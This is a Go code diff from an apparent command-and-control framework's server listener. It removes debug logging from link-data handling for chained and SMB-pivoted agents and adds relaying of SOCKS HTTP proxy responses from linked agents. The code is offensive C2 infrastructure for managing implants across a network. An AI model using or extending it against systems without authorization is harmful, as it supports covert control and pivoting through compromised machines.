@@ -2,6 +2,7 @@
 package listeners
 
 import (
+	"c2/internal/agent/socks_http"
 	"c2/internal/common/config"
 	"c2/internal/common/transforms"
 	pb "c2/proto"
@@ -222,7 +223,6 @@ func (lr *LinkRouting) GetLinkedAgents(edgeClientID string) ([]string, error) {
 // processLinkData handles link data from an edge agent's POST
 // This is called from handler_active.go after decrypting the edge agent's payload
 func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID string, linkData []interface{}) error {
-	log.Printf("[LINKDATA] processLinkData called from edge %s with %d items", edgeClientID[:8], len(linkData))
 
 	if m.linkRouting == nil {
 		var err error
@@ -234,20 +234,16 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 
 	cfg := m.linkRouting.malleable
 
-	for i, item := range linkData {
+	for _, item := range linkData {
 		itemMap, ok := item.(map[string]interface{})
 		if !ok {
-			log.Printf("[LINKDATA] Item %d: not a map, skipping", i)
 			continue
 		}
 
 		routingID, _ := itemMap[cfg.RoutingIDField].(string)
 		payload, _ := itemMap[cfg.PayloadField].(string)
 
-		log.Printf("[LINKDATA] Item %d: routingID=%s, payloadLen=%d", i, routingID, len(payload))
-
 		if routingID == "" || payload == "" {
-			log.Printf("[LINKDATA] Item %d: skipping - routingID or payload empty", i)
 			continue
 		}
 
@@ -255,7 +251,6 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 		// If it fails, this might be a new handshake from an unregistered SMB agent
 		linkedClientID, err := m.linkRouting.ResolveRoutingID(edgeClientID, routingID)
 		if err != nil {
-			log.Printf("[LINKDATA] RoutingID %s not found, treating as handshake", routingID)
 			// Unknown routing ID - this is likely a new handshake
 			response, err := m.processLinkHandshake(ctx, edgeClientID, itemMap)
 			if err != nil {
@@ -268,7 +263,6 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 			}
 			continue
 		}
-		log.Printf("[LINKDATA] Resolved routingID=%s to linkedClientID=%s", routingID, linkedClientID[:8])
 
 		// Get the linked agent's connection info
 		linkedConn, err := m.activeConnections.GetConnection(linkedClientID)
@@ -348,7 +342,6 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 			log.Printf("[LinkData] Failed to decrypt linked payload for %s: %v", linkedClientID, err)
 			continue
 		}
-		log.Printf("[LINKDATA] Decrypted payload for %s, len=%d", linkedClientID[:8], len(decryptedPayload))
 
 		// Parse the decrypted payload into a map for dynamic field access
 		// This allows configurable field names for nested link data
@@ -357,13 +350,6 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 			log.Printf("[LinkData] Failed to parse linked payload: %v", err)
 			continue
 		}
-
-		// Log what fields are present in the payload
-		var payloadFields []string
-		for k := range linkedDataMap {
-			payloadFields = append(payloadFields, k)
-		}
-		log.Printf("[LINKDATA] Payload fields for %s: %v", linkedClientID[:8], payloadFields)
 
 		// Extract fixed fields (agent_id, results)
 		var results []map[string]interface{}
@@ -376,24 +362,19 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 				}
 			}
 		}
-		log.Printf("[LINKDATA] Processing %d results for %s", len(results), linkedClientID[:8])
 
 		// Process the linked agent's results
 		if err := m.processResults(ctx, tx, linkedClientID, results); err != nil {
 			log.Printf("[LinkData] Failed to process linked results for %s: %v", linkedClientID, err)
 			continue
 		}
-		log.Printf("[LINKDATA] Successfully processed results for %s", linkedClientID[:8])
 
 		// RECURSIVE: Process nested link data from grandchild agents
 		// Use configurable field name from config
 		if nestedLinkData, ok := linkedDataMap[cfg.LinkDataField].([]interface{}); ok && len(nestedLinkData) > 0 {
-			log.Printf("[LINKDATA] Found %d nested link data items (field: %s) from %s - recursing", len(nestedLinkData), cfg.LinkDataField, linkedClientID[:8])
 			if err := m.processLinkData(ctx, tx, linkedClientID, nestedLinkData); err != nil {
 				log.Printf("[LinkData] Failed to process nested link data: %v", err)
 			}
-		} else {
-			log.Printf("[LINKDATA] No nested link data (field: %s) from %s", cfg.LinkDataField, linkedClientID[:8])
 		}
 
 		// Process nested link handshake from grandchild agent
@@ -411,6 +392,21 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 		// Use configurable field name from config
 		if unlinkNotifications, ok := linkedDataMap[cfg.LinkUnlinkField].([]interface{}); ok && len(unlinkNotifications) > 0 {
 			m.processUnlinkNotifications(ctx, linkedClientID, unlinkNotifications)
+		}
+
+		// Process SOCKS HTTP responses from linked agent ("sr" field)
+		if srRaw, exists := linkedDataMap["sr"]; exists {
+			if socksData, ok := srRaw.([]interface{}); ok && len(socksData) > 0 {
+				var responses []map[string]interface{}
+				for _, item := range socksData {
+					if m, ok := item.(map[string]interface{}); ok {
+						responses = append(responses, m)
+					}
+				}
+				if len(responses) > 0 {
+					socks_http.ProcessAgentResponses(linkedClientID, responses)
+				}
+			}
 		}
 
 		// Rotate the linked agent's secrets
